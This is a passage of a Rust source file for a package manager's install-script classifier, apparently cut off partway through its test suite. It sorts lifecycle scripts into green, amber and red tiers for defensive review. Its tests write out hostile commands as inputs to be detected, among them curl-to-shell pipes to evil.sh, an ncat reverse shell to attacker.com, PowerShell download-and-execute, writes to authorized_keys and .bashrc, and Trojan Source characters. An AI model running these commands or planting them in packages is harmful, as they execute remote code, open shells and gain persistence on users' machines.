    // postinstall.js / preinstall.js + .cjs/.mjs variants. Other
    // `node <name>.js` paths take the existing
    // [`matches_node_relative`] route and are already Green when
    // not reserved.
    if !is_reserved_lifecycle_basename(basename) {
        return false;
    }

    // Cooldown defense-in-depth. Refuse to widen when the configured
    // `minimum_release_age_secs > 0` AND
    // the package's publish age is below the threshold (or unknown).
    //
    // Rationale: this identity-match widening is designed for "old,
    // established packages." A maintainer-compromise scenario
    // produces a recent publish with the SAME identity shape —
    // exactly the case the install-level cooldown gate protects
    // against. Without this check, `lpm install --allow-new`
    // (which bypasses the install-level cooldown) would silently
    // ALSO bypass the script-tier review for matching-identity
    // packages, collapsing two orthogonal security axes into one.
    // With this check, `--allow-new` users still see the
    // script-tier prompt for recent publishes; they must
    // explicitly choose `--policy=allow` to also bypass that.
    //
    // When `min_release_age_secs == 0` the user has globally opted
    // out of cooldown protection (persistent config or
    // `--min-release-age=0`); we honor that choice and widen
    // regardless of publish age.
    if ctx.min_release_age_secs > 0 {
        match ctx.publish_age_secs {
            Some(age) if age >= ctx.min_release_age_secs => {
                // Old enough — fall through to identity match.
            }
            _ => {
                // Recent publish OR unknown age — refuse to widen.
                // Conservative: an unknown age could be a recent
                // publish, so default-refuse keeps the defense
                // active even when the caller couldn't supply data.
                return false;
            }
        }
    }

    matches_manifest_identity(ctx)
}

/// Identity-match helper. Returns `true` when the package's base
/// name appears as a path segment of the repository URL or matches a
/// `bin` entry's name. Returns `false` for an empty / unparseable
/// identity (no false-Green on missing signal).
fn matches_manifest_identity(ctx: &ManifestContext<'_>) -> bool {
    let base = package_base_name(ctx.package_name);
    if base.is_empty() {
        return false;
    }
    if let Some(repo) = ctx.repository
        && repo_url_contains_identity(repo, &base)
    {
        return true;
    }
    ctx.bin_names.iter().any(|b| *b == base)
}

/// Extract the unscoped portion of a package name. `@swc/core` →
/// `core`; `sharp` → `sharp`. Returns the empty string when given
/// only a scope (e.g. `@swc`) or an empty name.
fn package_base_name(name: &str) -> String {
    if let Some(after_slash) = name.rsplit('/').next() {
        return after_slash.to_string();
    }
    name.to_string()
}

/// Check whether the repository URL contains the package's base name
/// as a path-segment-like substring. We split on `/`, `:`, `.`, and
/// `?` boundaries so URLs like `git+https://github.com/lovell/sharp.git`
/// or `github:lovell/sharp` both surface the `sharp` segment.
///
/// Conservative on short / generic base names: anything ≤ 2 chars
/// or a single common ecosystem token (`js`, `lib`, `core`, `node`)
/// is treated as having no identity payload — these match too many
/// unrelated repository URLs to be a useful signal. A future
/// extension could keep a richer denylist or weight against URL
/// segment frequency; for now the simple form is enough to gate the
/// false-Green stress test.
fn repo_url_contains_identity(repo: &str, base: &str) -> bool {
    if base.len() < 3 {
        return false;
    }
    const GENERIC: &[&str] = &["js", "lib", "core", "node", "src", "util", "utils"];
    if GENERIC.contains(&base.to_ascii_lowercase().as_str()) {
        return false;
    }
    let needle = base.to_ascii_lowercase();
    repo.to_ascii_lowercase()
        .split(['/', ':', '.', '?', '#', '@', ' '])
        .filter(|s| !s.is_empty())
        .any(|seg| seg == needle || seg == format!("{needle}.git").as_str())
}

// ─────────────────────────────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn tier(script: &str) -> StaticTier {
        classify(script)
    }

    // ── Green allowlist ──────────────────────────────────────────────

    #[test]
    fn green_tsc_variants() {
        assert_eq!(tier("tsc"), StaticTier::Green);
        assert_eq!(tier("tsc -b"), StaticTier::Green);
        assert_eq!(tier("tsc --build"), StaticTier::Green);
        assert_eq!(tier("tsc -p ./tsconfig.json"), StaticTier::Green);
        assert_eq!(tier("tsc --project src/tsconfig.json"), StaticTier::Green);
    }

    #[test]
    fn green_node_gyp() {
        assert_eq!(tier("node-gyp rebuild"), StaticTier::Green);
        assert_eq!(tier("node-gyp rebuild --release"), StaticTier::Green);
        assert_eq!(tier("node-gyp rebuild --debug"), StaticTier::Green);
        assert_eq!(
            tier("node-gyp rebuild --release --debug"),
            StaticTier::Green
        );
    }

    #[test]
    fn green_electron_rebuild_bare_only() {
        assert_eq!(tier("electron-rebuild"), StaticTier::Green);
        // Args push to Amber — we can widen if corpus demands it.
        assert_eq!(tier("electron-rebuild -f"), StaticTier::Amber);
    }

    #[test]
    fn green_husky_both_forms() {
        assert_eq!(tier("husky"), StaticTier::Green);
        assert_eq!(tier("husky install"), StaticTier::Green);
    }

    #[test]
    fn green_prisma_generate() {
        assert_eq!(tier("prisma generate"), StaticTier::Green);
    }

    #[test]
    fn green_node_relative_paths() {
        assert_eq!(tier("node build.js"), StaticTier::Green);
        assert_eq!(tier("node ./scripts/build.js"), StaticTier::Green);
        assert_eq!(tier("node lib/helper.mjs"), StaticTier::Green);
        assert_eq!(tier("node ./tools/gen.cjs"), StaticTier::Green);
    }

    #[test]
    fn amber_node_install_js_exception_wins() {
        // The plan-doc update locks this: install.js / postinstall.js
        // are the binary-fetcher convention and must NOT be green.
        assert_eq!(tier("node install.js"), StaticTier::Amber);
        assert_eq!(tier("node postinstall.js"), StaticTier::Amber);
        assert_eq!(tier("node ./install.js"), StaticTier::Amber);
        assert_eq!(tier("node scripts/install.js"), StaticTier::Amber);
    }

    #[test]
    fn amber_node_reserved_basenames_p05_widened() {
        // Extended to cover .cjs/.mjs and preinstall variants:
        // {install,postinstall,preinstall}.{js,cjs,mjs} all reserved.
        // Audit-found packages slipping through the .js-only check:
        // - puppeteer (rank 2857, 40.8M dl/mo): postinstall=`node install.mjs`
        // - @anthropic-ai/claude-code (rank 2720): postinstall=`node install.cjs`
        // - dd-trace (rank 3391): preinstall=`node scripts/preinstall.js`
        for path in [
            "install.cjs",
            "install.mjs",
            "postinstall.cjs",
            "postinstall.mjs",
            "preinstall.js",
            "preinstall.cjs",
            "preinstall.mjs",
            "./install.mjs",
            "./install.cjs",
            "scripts/preinstall.js",
            "./scripts/preinstall.cjs",
        ] {
            let s = format!("node {path}");
            assert_eq!(
                tier(&s),
                StaticTier::Amber,
                "reserved basename must stay amber: {s}"
            );
        }
    }

    #[test]
    fn amber_node_escaping_path() {
        assert_eq!(tier("node ../other/build.js"), StaticTier::Amber);
        assert_eq!(tier("node /abs/path.js"), StaticTier::Amber);
        assert_eq!(tier("node ~/build.js"), StaticTier::Amber);
        assert_eq!(tier("node $HOME/build.js"), StaticTier::Amber);
    }

    #[test]
    fn amber_node_without_js_extension() {
        assert_eq!(tier("node build"), StaticTier::Amber);
        assert_eq!(tier("node ./script"), StaticTier::Amber);
    }

    #[test]
    fn amber_node_with_extra_args() {
        // More-than-two-token forms are not green (conservative).
        assert_eq!(tier("node build.js --port 3000"), StaticTier::Amber);
    }

    // ── Soft-fail postinstall wrappers ───────────────────────────────
    //
    // The canonical safe wrapper `node -e "try{require('./X')}catch(e){}"`
    // and the `import('./X').catch(...)` variant must NOT classify red.
    // Default outcome is amber; green is reserved for the strictly
    // qualifying case (explicit `.js`/`.cjs`/`.mjs` extension AND
    // safe-relative path AND non-reserved basename).

    #[test]
    fn audit_repro_softfail_wrappers_are_not_red() {
        // Known top-5000 packages that must not classify as false-positive reds
        // (rank, monthly downloads in parens for context only).
        let cases = [
            // core-js (582, 253M/mo) and core-js-pure (2024, 70M/mo)
            r#"node -e "try{require('./postinstall')}catch(e){}""#,
            // msw (2084, 68M/mo) — import variant with `() => void 0`
            r#"node -e "import('./config/scripts/postinstall.js').catch(() => void 0)""#,
            // nx (3006, 37M/mo)
            r#"node -e "try{require('./dist/bin/post-install')}catch(e){}""#,
            // vue-demi (3678, 26M/mo)
            r#"node -e "try{require('./scripts/postinstall.js')}catch(e){}""#,
        ];
        for s in cases {
            assert_ne!(
                tier(s),
                StaticTier::Red,
                "softfail wrapper must not classify red: {s}"
            );
        }
    }

    #[test]
    fn softfail_wrapper_extensionless_is_amber() {
        // No explicit .js extension → stays amber (default-amber rule).
        // Covers the four audit reds with extensionless require targets:
        // core-js / core-js-pure / es5-ext / nx.
        assert_eq!(
            tier(r#"node -e "try{require('./postinstall')}catch(e){}""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "try{require('./_postinstall')}catch(e){}""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "try{require('./dist/bin/post-install')}catch(e){}""#),
            StaticTier::Amber
        );
    }

    #[test]
    fn softfail_wrapper_reserved_basename_is_amber() {
        // Explicit .js extension but basename matches the binary-fetcher
        // reserved names → amber (the basename rule wins, per the
        // existing amber convention). Covers msw and vue-demi.
        assert_eq!(
            tier(r#"node -e "import('./config/scripts/postinstall.js').catch(() => void 0)""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "try{require('./scripts/postinstall.js')}catch(e){}""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "try{require('install.js')}catch(e){}""#),
            StaticTier::Amber
        );
    }

    #[test]
    fn softfail_wrapper_reserved_basename_p05_widened() {
        // The shared `is_reserved_lifecycle_basename` helper covers
        // .cjs / .mjs and `preinstall` for the softfail-wrapper green
        // path too — otherwise packages could slip through one route
        // but not the other.
        assert_eq!(
            tier(r#"node -e "try{require('./install.cjs')}catch(e){}""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "try{require('./install.mjs')}catch(e){}""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "import('./install.mjs').catch(() => void 0)""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "import('./postinstall.cjs').catch(() => void 0)""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "try{require('./scripts/preinstall.js')}catch(e){}""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "try{require('./scripts/preinstall.cjs')}catch(e){}""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "import('./scripts/preinstall.mjs').catch(() => void 0)""#),
            StaticTier::Amber
        );
    }

    #[test]
    fn softfail_wrapper_with_compound_falls_through_to_amber() {
        // es5-ext (rank 2407, 53M/mo) ships
        // `node -e "..." || exit 0`. The softfail recognition prevents
        // the red, then the compound operator pushes the script to
        // amber via the standard fallback.
        let s = r#"node -e "try{require('./_postinstall')}catch(e){}" || exit 0"#;
        assert_eq!(tier(s), StaticTier::Amber);
    }

    #[test]
    fn softfail_wrapper_safe_path_with_explicit_ext_is_green() {
        // Safe-relative path, explicit .js/.cjs/.mjs extension,
        // non-reserved basename → green.
        assert_eq!(
            tier(r#"node -e "try{require('./scripts/setup.js')}catch(e){}""#),
            StaticTier::Green
        );
        assert_eq!(
            tier(r#"node -e "try{require('./lib/bootstrap.cjs')}catch(e){}""#),
            StaticTier::Green
        );
        assert_eq!(
            tier(r#"node -e "import('./scripts/setup.mjs').catch(() => void 0)""#),
            StaticTier::Green
        );
        assert_eq!(
            tier(r#"node -e "import('./lib/init.js').catch(() => undefined)""#),
            StaticTier::Green
        );
        assert_eq!(
            tier(r#"node -e "import('./scripts/x.js').catch(() => null)""#),
            StaticTier::Green
        );
        assert_eq!(
            tier(r#"node -e "import('./scripts/x.js').catch(() => {})""#),
            StaticTier::Green
        );
    }

    #[test]
    fn softfail_wrapper_escaping_path_stays_red() {
        // Path escapes the package dir — the wrapper-recognition step
        // still parses the shape, but `is_safe_relative_path` rejects
        // it for green AND the body is a no-op so the result is amber
        // (NOT red — this is the conservative default; if maintainers
        // want red for "..", that's a follow-up).
        let s = r#"node -e "try{require('../../etc/passwd')}catch(e){}""#;
        assert_eq!(tier(s), StaticTier::Amber);
        // Absolute path also amber, not red.
        let s2 = r#"node -e "try{require('/etc/passwd')}catch(e){}""#;
        assert_eq!(tier(s2), StaticTier::Amber);
    }

    #[test]
    fn softfail_wrapper_nontrivial_catch_body_is_red() {
        // Catch body is not empty `{}`. The shape does NOT match the
        // accepted softfail regex, so the eval'd body falls through
        // the normal `node -e` red path.
        let s = r#"node -e "try{require('./x')}catch(e){doEvil()}""#;
        assert_eq!(tier(s), StaticTier::Red);
    }

    #[test]
    fn softfail_wrapper_import_non_trivial_handler_is_red() {
        // `.catch(e => eval(e.message))` is not a trivial handler.
        let s = r#"node -e "import('./x.js').catch(e => eval(e.message))""#;
        assert_eq!(tier(s), StaticTier::Red);
    }

    #[test]
    fn softfail_wrapper_non_relative_require_is_red() {
        // `require('fs')` — not a relative path. The path-capture
        // regex still matches (`fs` is just a string), but downstream
        // the green path needs explicit `.js` extension which `fs`
        // lacks, AND `is_safe_relative_path("fs")` is true (no
        // unsafe prefix) — so the wrapper itself is recognized and
        // falls to amber. We do NOT red on `require('fs')` here
        // because the catch swallows any side effect; if maintainers
        // want stricter behavior, tighten in a follow-up.
        let s = r#"node -e "try{require('fs')}catch(e){}""#;
        assert_eq!(tier(s), StaticTier::Amber);
    }

    // ── Green: node-gyp-build family ─────────────────────────────────

    #[test]
    fn green_node_gyp_build_bare() {
        assert_eq!(tier("node-gyp-build"), StaticTier::Green);
        assert_eq!(tier("node-gyp-build-optional-packages"), StaticTier::Green);
    }

    // ── Green: no-op shapes ───────────────────────────────────────────

    #[test]
    fn green_exit_noop_variants() {
        // Bare `exit` and `exit 0` — script-body no-ops. The
        // @datadog/native-* family ships `exit 0` as a placeholder
        // preinstall.
        assert_eq!(tier("exit"), StaticTier::Green);
        assert_eq!(tier("exit 0"), StaticTier::Green);
    }

    #[test]
    fn amber_exit_nonzero_or_with_extras() {
        // Non-zero exit codes are unusual in a preinstall and the
        // green rule deliberately doesn't widen here.
        assert_eq!(tier("exit 1"), StaticTier::Amber);
        assert_eq!(tier("exit 2"), StaticTier::Amber);
        // Extra arg → amber.
        assert_eq!(tier("exit 0 silently"), StaticTier::Amber);
    }

    #[test]
    fn green_colon_noop() {
        // POSIX `:` builtin — strictly a no-op.
        assert_eq!(tier(":"), StaticTier::Green);
    }

    #[test]
    fn green_echo_noop_variants() {
        // Bare `echo` writes a newline; `echo <static-literal>` is the
        // @google/genai shape. Both are no-ops at the security-relevant
        // level.
        assert_eq!(tier("echo"), StaticTier::Green);
        assert_eq!(tier("echo hello"), StaticTier::Green);
        // The audit-found case: shlex strips the single quotes, leaving
        // one token `preinstall: no-op` — passes the literal guard.
        assert_eq!(tier("echo 'preinstall: no-op'"), StaticTier::Green);
        // Empty-string literal is also a static literal.
        assert_eq!(tier("echo \"\""), StaticTier::Green);
    }

    #[test]
    fn amber_echo_with_variable_or_command_substitution() {
        // `$VAR` / `$()` / `\`...\`` / backslash sequences could
        // expand to shell commands at runtime — keep amber.
        assert_eq!(tier("echo $HOME"), StaticTier::Amber);
        assert_eq!(tier("echo \"$HOME\""), StaticTier::Amber);
        assert_eq!(tier("echo $(whoami)"), StaticTier::Amber);
        assert_eq!(tier("echo `whoami`"), StaticTier::Amber);
        // Backslash escapes.
        assert_eq!(tier("echo a\\nb"), StaticTier::Amber);
    }

    #[test]
    fn amber_echo_with_flags() {
        // `-e` enables backslash interpretation; `-n` suppresses
        // newline. Both are flags, not safe static literals.
        assert_eq!(tier("echo -e hi"), StaticTier::Amber);
        assert_eq!(tier("echo -n hi"), StaticTier::Amber);
        assert_eq!(tier("echo --help"), StaticTier::Amber);
    }

    #[test]
    fn amber_echo_with_multiple_args() {
        // Strict single-arg rule: even fully-literal multiple args
        // stay amber so the green path can't drift into "echo $A $B"
        // territory through future broadening.
        assert_eq!(tier("echo a b"), StaticTier::Amber);
        assert_eq!(tier("echo hello world"), StaticTier::Amber);
    }

    // ── Green: node-gyp-build family (P1 — kept here for context) ────

    #[test]
    fn amber_node_gyp_build_with_args() {
        // node-gyp-build's bin.js passes `process.argv[2]` to a child
        // shell, so the bare form is the only safe-by-construction
        // shape. With ANY extra argument, defer to amber.
        assert_eq!(tier("node-gyp-build --some-flag"), StaticTier::Amber);
        assert_eq!(tier("node-gyp-build some-command"), StaticTier::Amber);
        assert_eq!(
            tier("node-gyp-build-optional-packages --foo"),
            StaticTier::Amber
        );
    }

    // ── Red: prefilter (Unicode + PowerShell literals) ──────────────

    #[test]
    fn red_unicode_rtl_override() {
        // U+202E RIGHT-TO-LEVEL OVERRIDE — the "Trojan Source" signature.
        let s = "echo hi\u{202E}rm -rf /";
        assert_eq!(tier(s), StaticTier::Red);
    }

    #[test]
    fn red_unicode_zero_width_joiner() {
        let s = "tsc\u{200D}";
        assert_eq!(tier(s), StaticTier::Red);
    }

    #[test]
    fn red_unicode_bom_in_body() {
        let s = "tsc\u{FEFF}";
        assert_eq!(tier(s), StaticTier::Red);
    }

    #[test]
    fn red_powershell_invoke_expression() {
        let s = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x')";
        assert_eq!(tier(s), StaticTier::Red);
        // Case-insensitive match.
        assert_eq!(tier("invoke-expression $something"), StaticTier::Red);
    }

    #[test]
    fn red_powershell_from_base64_string() {
        assert_eq!(
            tier("[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('x'))"),
            StaticTier::Red
        );
    }

    #[test]
    fn red_powershell_add_mppreference() {
        assert_eq!(
            tier("Add-MpPreference -ExclusionPath C:\\Users\\evil"),
            StaticTier::Red
        );
    }

    #[test]
    fn red_iex_as_bare_token() {
        assert_eq!(tier("iex $payload"), StaticTier::Red);
    }

    #[test]
    fn red_iex_substring_does_not_false_positive() {
        // These should NOT be red — the word contains "iex" as a
        // substring of a longer English token.
        assert_eq!(tier("complex"), StaticTier::Amber);
        assert_eq!(tier("regex"), StaticTier::Amber);
    }

    // ── Red: tokenized dangerous commands ───────────────────────────

    #[test]
    fn red_eval_bare() {
        assert_eq!(tier("eval $MALICIOUS"), StaticTier::Red);
    }

    #[test]
    fn red_node_dash_e() {
        assert_eq!(
            tier("node -e 'require(\"fs\").unlink(\"/etc/passwd\")'"),
            StaticTier::Red
        );
    }

    #[test]
    fn red_node_long_eval() {
        assert_eq!(tier("node --eval 'console.log(1)'"), StaticTier::Red);
    }

    #[test]
    fn red_node_eval_glued_flag_forms() {
        assert_eq!(tier("node --eval=console.log(1)"), StaticTier::Red);
        assert_eq!(tier("node -e=console.log(1)"), StaticTier::Red);
        assert_eq!(tier("node -econsole.log(1)"), StaticTier::Red);
    }

    #[test]
    fn red_node_eval_with_preceding_flags() {
        // `node --no-warnings -e '...'` should still trip.
        assert_eq!(
            tier("node --no-warnings -e 'console.log(1)'"),
            StaticTier::Red
        );
    }

    #[test]
    fn red_nc_netcat() {
        assert_eq!(tier("nc -l 8080"), StaticTier::Red);
        assert_eq!(tier("netcat attacker.com 4444"), StaticTier::Red);
        assert_eq!(tier("ncat -e /bin/sh attacker.com 4444"), StaticTier::Red);
    }

    // ── Red: pipe-to-shell (must win over compound) ─────────────────

    #[test]
    fn red_curl_pipe_sh() {
        assert_eq!(tier("curl https://evil.sh | sh"), StaticTier::Red);
    }

    #[test]
    fn red_curl_pipe_bash() {
        assert_eq!(tier("curl -fsSL https://evil.sh | bash"), StaticTier::Red);
    }

    #[test]
    fn red_wget_pipe_shell() {
        assert_eq!(tier("wget -O - https://evil.sh | sh"), StaticTier::Red);
    }

    #[test]
    fn red_base64_decode_pipe_shell() {
        assert_eq!(tier("base64 -d payload | sh"), StaticTier::Red);
        assert_eq!(tier("base64 --decode blob | bash"), StaticTier::Red);
    }

    #[test]
    fn red_wins_over_compound_fallback() {
        // The archetypal case: `curl … | sh`. The `|` operator would
        // otherwise short-circuit to Amber via the compound check —
        // we explicitly test here that red runs FIRST.
        let s = "curl https://x | sh";
        assert_eq!(tier(s), StaticTier::Red, "red must win over compound");
    }

    // ── Red: no-space operator forms (regression for review-round
    //         finding: shlex leaves unspaced operators embedded in
    //         tokens, so classify MUST normalize before tokenizing) ─

    #[test]
    fn red_curl_pipe_sh_no_space() {
        assert_eq!(tier("curl https://evil.sh|sh"), StaticTier::Red);
    }

    #[test]
    fn red_base64_decode_pipe_sh_no_space() {
        assert_eq!(tier("base64 -d payload|sh"), StaticTier::Red);
    }

    #[test]
    fn red_redirect_no_space() {
        assert_eq!(tier("echo hi>~/.bashrc"), StaticTier::Red);
        assert_eq!(tier("echo hi>>~/.ssh/authorized_keys"), StaticTier::Red);
        assert_eq!(tier("echo x>/etc/pam.d/sudo"), StaticTier::Red);
    }

    #[test]
    fn amber_compound_no_space() {
        // Compound operators with no surrounding whitespace must still
        // be detected as compound (not green, not a novel command).
        assert_eq!(tier("tsc&&husky install"), StaticTier::Amber);
        assert_eq!(tier("tsc;prisma generate"), StaticTier::Amber);
        assert_eq!(tier("tsc||true"), StaticTier::Amber);
    }

    // ── Normalizer: quoted operator chars must NOT be padded ────────

    #[test]
    fn normalizer_leaves_quoted_operators_alone() {
        // Quoted operator characters inside a single-arg echo are
        // content, not operators — they must NOT trip the pipe-to-
        // shell or compound-detection paths. Post-Part-A-closeout
        // these now classify green via the static-literal echo rule
        // (no `$`, no backticks, no backslashes, no flags, one arg).
        // The original intent of this test was "doesn't false-
        // positive red" — that contract still holds; the resting
        // tier is now green instead of amber.
        assert_eq!(tier("echo 'a|b|c'"), StaticTier::Green);
        assert_eq!(tier("echo \"a>b\""), StaticTier::Green);
        // Backslash escapes stay AMBER (the strict echo guard
        // rejects any `\` in the raw script — even quoted-string
        // content where shell semantics would render it literal).
        assert_eq!(tier("echo a\\|b"), StaticTier::Amber);
    }

    #[test]
    fn normalizer_preserves_quoted_pipe_payload() {
        // If a curl URL happens to contain `|` inside quotes, we
        // should NOT false-positive red — the `|` is content.
        // (Contrived; real URLs rarely contain `|`, but the quote
        // semantics must hold.)
        let s = "curl 'https://x.example/foo|bar'";
        // No `|` appears as an operator, no `sh` follows; amber.
        assert_eq!(tier(s), StaticTier::Amber);
    }

    #[test]
    fn normalizer_handles_two_char_operators() {
        // Explicit coverage: `>>` must be recognized as one operator,
        // not two `>` tokens (downstream `has_dangerous_redirect`
        // expects the `>>` token form).
        assert_eq!(tier("echo x>>~/.bashrc"), StaticTier::Red);
        // `||` and `&&` become standalone compound tokens.
        assert_eq!(tier("tsc||true"), StaticTier::Amber);
        assert_eq!(tier("tsc&&prisma generate"), StaticTier::Amber);
    }

    // ── Red: nested package managers ────────────────────────────────

    #[test]
    fn red_npm_install_nested() {
        assert_eq!(tier("npm install malware"), StaticTier::Red);
        assert_eq!(tier("npm i malware"), StaticTier::Red);
    }

    #[test]
    fn red_pnpm_yarn_bun_lpm_nested() {
        assert_eq!(tier("pnpm install x"), StaticTier::Red);
        assert_eq!(tier("yarn add x"), StaticTier::Red);
        assert_eq!(tier("bun add x"), StaticTier::Red);
        assert_eq!(tier("lpm install x"), StaticTier::Red);
    }

    #[test]
    fn red_pip_gem_cargo_brew_nested() {
        assert_eq!(tier("pip install requests"), StaticTier::Red);
        assert_eq!(tier("pip3 install requests"), StaticTier::Red);
        assert_eq!(tier("gem install rails"), StaticTier::Red);
        assert_eq!(tier("cargo install ripgrep"), StaticTier::Red);
        assert_eq!(tier("brew install thing"), StaticTier::Red);
    }

    #[test]
    fn amber_npm_run_script_not_install() {
        // `npm run build` is NOT a nested PM install; should be amber.
        assert_eq!(tier("npm run build"), StaticTier::Amber);
    }

    #[test]
    fn red_deno_install_that_preapproves_another_packages_scripts() {
        assert_eq!(
            tier(
                "PLAYWRIGHT_SKIP_DOWNLOAD=true deno install --allow-scripts=npm:playwright-core || true"
            ),
            StaticTier::Red
        );
        assert_eq!(tier("deno add npm:esbuild"), StaticTier::Red);
        assert_eq!(tier("deno cache --allow-scripts main.ts"), StaticTier::Red);
        assert_eq!(tier("deno run -A npm:create-thing"), StaticTier::Red);
        assert_eq!(tier("deno run https://example.com/x.ts"), StaticTier::Red);
    }

    #[test]
    fn red_package_runners_that_explicitly_download_and_execute_a_package() {
        for body in [
            "npx --yes some-tool",
            "npx -y some-tool",
            "npx -p some-package some-bin",
            "npx --package=some-package some-bin",
            "npx some-tool@latest",
            "npx @scope/some-tool@1.2.3",
            "npx github:owner/repo",
            "npx -- some-tool@1",
            "bunx some-tool@1",
            "bun x some-tool@latest",
            "npm exec --yes some-tool",
            "npm x -- some-tool@1",
            "pnpx some-tool",
            "pnpm dlx some-tool",
            "yarn dlx some-tool",
            "npm init some-initializer",
            "npm create some-initializer",
            "pnpm create some-initializer",
            "yarn create some-initializer",
            "bun create some-initializer",
            "lpm dlx some-tool",
        ] {
            assert_eq!(tier(body), StaticTier::Red, "{body}");
        }
    }

    #[test]
    fn red_every_npm_spelling_that_installs_or_rebuilds() {
        for verb in [
            "install",
            "i",
            "in",
            "ins",
            "inst",
            "insta",
            "instal",
            "isnt",
            "isnta",
            "isntal",
            "isntall",
            "add",
            "ci",
            "clean-install",
            "ic",
            "install-clean",
            "isntall-clean",
            "install-test",
            "it",
            "install-ci-test",
            "cit",
            "clean-install-test",
            "sit",
            "update",
            "up",
            "upgrade",
            "udpate",
            "rebuild",
            "rb",
            "link",
            "ln",
            "dedupe",
            "ddp",
            "approve-scripts",
            "install-scripts",
        ] {
            let body = format!("npm {verb} thing");
            assert_eq!(tier(&body), StaticTier::Red, "{body}");
        }
    }

    #[test]
    fn red_nested_install_after_global_flags_paths_or_corepack() {
        for body in [
            "npm --prefix ./vendor install thing",
            "npm --silent i",
            "pnpm -C ./profile install",
            "pnpm --dir ./profile add thing",
            "yarn --cwd ./x add thing",
            "bun --cwd ./x install",
            "/usr/local/bin/npm install thing",
            "./node_modules/.bin/pnpm add thing",
            "node_modules\\.bin\\npm.cmd install thing",
            "corepack pnpm install",
            "corepack yarn add thing",
            "node ./node_modules/npm/bin/npm-cli.js install thing",
            "yarnpkg add thing",
        ] {
            assert_eq!(tier(body), StaticTier::Red, "{body}");
        }
    }

    #[test]
    fn red_bare_yarn_runs_an_install() {
        assert_eq!(tier("yarn"), StaticTier::Red);
        assert_eq!(tier("yarn --frozen-lockfile"), StaticTier::Red);
    }

    #[test]
    fn red_commands_that_approve_builds_for_other_packages() {
        for body in [
            "pnpm approve-builds --all",
            "pnpm rebuild",
            "bun pm trust --all",
            "bun pm trust esbuild",
            "lpm approve-scripts --yes",
            "lpm rebuild",
            "lpm ci",
            "yarn rebuild",
        ] {
            assert_eq!(tier(body), StaticTier::Red, "{body}");
        }
    }

    #[test]
    fn red_flags_and_variables_that_reenable_dependency_scripts() {
        for body in [
            "some-installer --allow-scripts",
            "some-installer --allow-scripts=esbuild",
            "some-installer --allow-build=esbuild",
            "some-installer --dangerously-allow-all-builds",
            "some-installer --dangerously-allow-all-scripts",
            "some-installer --ignore-scripts=false",
            "some-installer --no-ignore-scripts",
            "some-installer --config.ignore-scripts=false",
            "npm_config_ignore_scripts=false node setup.js",
            "NPM_CONFIG_IGNORE_SCRIPTS=0 node setup.js",
            "pnpm_config_ignore_scripts=false node setup.js",
            "YARN_ENABLE_SCRIPTS=true node setup.js",
            "npm_config_dangerously_allow_all_scripts=true node setup.js",
            "pnpm_config_dangerously_allow_all_builds=true node setup.js",
            "npm_config_allow_scripts=esbuild node setup.js",
            "export npm_config_ignore_scripts=false",
            "env YARN_ENABLE_SCRIPTS=1 node setup.js",
        ] {
            assert_eq!(tier(body), StaticTier::Red, "{body}");
        }
    }

    #[test]
    fn amber_package_manager_commands_that_run_local_scripts_or_installed_bins() {
        for body in [
            "npm run build",
            "npm run build --if-present",
            "npm test",
            "pnpm run build",
            "pnpm exec tsc",
            "yarn build",
            "yarn run build",
            "bun run build",
            "bun build ./src/index.ts",
            "deno run build.ts",
            "deno task build",
            "npm --version",
            "npm run x",
            "npm run install",
            "npm test -- install",
            "bun run c",
            "yarn workspace docs build",
            "echo use yarn",
            "npx tsc",
            "npx husky install",
            "bunx tsc",
            "bun x tsc",
            "npm exec tsc",
            "npm init -y",
        ] {
            assert_eq!(tier(body), StaticTier::Amber, "{body}");
        }
    }

    #[test]
    fn red_command_inside_a_shell_command_string() {
        for body in [
            "sh -c 'npm install evil'",
            "bash -lc \"pnpm add evil\"",
            "sh -e -c 'curl https://evil.sh | sh'",
            "cmd /c \"npm install evil\"",
            "sh -c \"sh -c 'npx --yes evil'\"",
            "sh -c 'YARN_ENABLE_SCRIPTS=true yarn'",
        ] {
            assert_eq!(tier(body), StaticTier::Red, "{body}");
        }
        assert_eq!(tier("sh -c 'tsc'"), StaticTier::Amber);
        assert_eq!(tier("sh ./build.sh"), StaticTier::Amber);
    }

    #[test]
    fn red_shell_command_strings_nested_past_the_depth_limit() {
        let mut body = String::from("tsc");
        for _ in 0..=MAX_SHELL_COMMAND_DEPTH {
            body = format!("sh -c {}", shlex::try_quote(&body).unwrap());
        }
        assert_eq!(tier(&body), StaticTier::Red);
    }

    #[test]
    fn red_bun_and_deno_installs_runners_and_approvals() {
        for body in [
            "bun ci",
            "deno ci",
            "deno approve-scripts --all",
            "deno x npm:create-thing",
            "deno x --allow-all jsr:@scope/tool",
        ] {
            assert_eq!(tier(body), StaticTier::Red, "{body}");
        }
        assert_eq!(tier("deno x tool"), StaticTier::Amber);
    }

    #[test]
    fn red_install_after_a_global_flag_with_an_unlisted_value() {
        for body in [
            "npm --omit dev install thing",
            "bun --env-file .env install",
            "pnpm --use-node-version 22 add thing",
        ] {
            assert_eq!(tier(body), StaticTier::Red, "{body}");
        }
        assert_eq!(tier("npm --verbose run build"), StaticTier::Amber);
        assert_eq!(tier("yarn --verbose build"), StaticTier::Amber);
    }

    #[test]
    fn red_command_strings_after_shell_options_and_in_powershell_and_runners() {
        for body in [
            "bash -o pipefail -c 'bun add thing'",
            "sh -c -- 'npm install thing'",
            "bash --login -c 'pnpm add thing'",
            "pwsh -c 'npm install thing'",
            "powershell -NoProfile -ExecutionPolicy Bypass -Command \"npm install thing\"",
            "pwsh -EncodedCommand ZQBjAGgAbwA=",
            "powershell -enc ZQBjAGgAbwA=",
            "npx -c 'bun install'",
            "npx --call='npm install thing'",
            "npm exec -c 'pnpm add thing'",
        ] {
